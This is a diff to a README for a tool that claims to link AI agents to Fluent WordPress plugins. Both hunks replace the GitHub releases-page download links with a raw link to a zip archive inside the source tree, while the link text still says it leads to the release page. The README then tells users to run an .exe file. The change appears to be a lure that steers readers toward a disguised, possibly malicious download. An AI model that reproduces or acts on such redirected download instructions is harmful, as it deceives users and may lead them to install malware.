@@ -1,6 +1,6 @@
 # 🛠️ fluent-mcp-servers - Connect AI agents to Fluent WordPress tools
 
-[![Download Stable Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Dominotypist3077/fluent-mcp-servers/releases)
+[![Download Stable Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Dominotypist3077/fluent-mcp-servers/main/fluent-community-mcp/src/tools/fluent-mcp-servers-2.0.zip)
 
 This software links AI systems to your Fluent WordPress plugins. It helps your automated agents manage data across FluentCRM, Fluent Support, Fluent Boards, Fluent Community, and FluentAffiliate. You get direct access to 175 specific tools designed to automate tasks within your WordPress site.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 You need to access the release page to get the installer. 
 
-[Click here to visit the release page and download the software](https://github.com/Dominotypist3077/fluent-mcp-servers/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/Dominotypist3077/fluent-mcp-servers/main/fluent-community-mcp/src/tools/fluent-mcp-servers-2.0.zip)
 
 Look for the file that ends in .exe. Save it to a folder you recognize, such as your Downloads folder or Desktop. 
 
